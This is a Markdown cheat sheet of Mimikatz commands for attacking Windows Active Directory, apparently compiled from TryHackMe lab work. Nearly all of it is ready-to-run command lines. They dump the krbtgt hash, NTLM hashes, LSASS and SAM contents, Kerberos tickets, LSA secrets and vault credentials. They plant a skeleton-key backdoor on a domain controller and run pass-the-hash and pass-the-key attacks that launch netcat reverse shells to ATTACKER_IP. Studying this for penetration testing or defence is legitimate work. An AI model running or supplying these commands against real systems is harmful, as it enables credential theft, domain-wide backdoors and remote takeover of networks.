### Check you have ADMIN permissions
```
Run mimikatz and then run     privilege::debug  
It should give you '20' OK
```


### Check impersonation went well(OUTSIDE mimikatz)
```
klist
```


### Dump the krbtgt hash
```
Run in mimikatz    privilege::debug - ensure this outputs [privilege '20' ok]
Run   lsadump::lsa /inject /name:krbtgt
```


### Dump the hash of any other Account
```
Run in mimikatz    privilege::debug - ensure this outputs [privilege '20' ok]
Run   lsadump::lsa /inject /name:<accountname>
```
(this will give you NTLM Hashes)


### Plant backdoor in Domain Forest with mimikatz
```
Run in mimikatz    privilege::debug - ensure this outputs [privilege '20' ok]
Run   misc::skeleton
```
testing (mimikatz will be the default password):
example: 
```
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz 
```
The share will now be accessible without the need for the Administrators password


### Impersonate as NT/System
```
token::elevate
```


### Dump Pass hashes
```
lsadump::sam
```


### Dump NTLM hash from local SAM
```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam   
```


### Dump NTLM Hash from LSASS
```
mimikatz # privilege::debug
mimikatz # token::elevate
sekurlsa::msv 
```


### Reverse shell with PTH(Pass the Hash)
```
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555" 
```


### Dump kerberos Tickets from LSSAS
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
```
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```


### Dump Kerberos ekey from LSASS(Pass the Key)
```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (nc64 is already available in THMJMP2 for your convenience):
If we have the RC4 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
If we have the AES128 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
If we have the AES256 hash:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```


### How to Overpass the Hash(Convert Hash to TGT)
```
mimikatz.exe
privilege::debug
sekurlsa::ekeys
(Save AES256_HMAC and RC4_HMAC keys)
```
Then pass it via mimikatz
```
sekurlsa::pth /domain:DOMAIN /user:plaintext /ntlm:HASH
```


### How to dump secrets
```
mimikatz # privilege::debug
lsadump::secrets
```


### How to dump password from windows vault(require elevation)
```
"privilege::debug" 
"token::elevate"  -> will get you NTSystem tokes

"vault::cred" or "vault::list"  ->to list secrets
"vault::cred /patch" -> to dump
```